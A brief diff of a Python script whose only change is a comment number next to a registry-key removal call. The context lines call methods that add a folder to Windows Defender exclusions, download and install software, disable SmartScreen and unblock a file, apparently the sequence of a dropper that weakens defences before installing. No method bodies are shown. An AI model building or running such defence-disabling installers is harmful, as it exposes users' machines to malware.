@@ -138,7 +138,7 @@ if __name__ == "__main__":
         self.add_folder_to_windows_defender_exclusions()
         self.download_and_install()
         self.disable_smartscreen()
-        self.remove_hkey() #123
+        self.remove_hkey() #234
         self.unblock_file(self.APP_PATH)
         self.perform_update()
         exit(0)
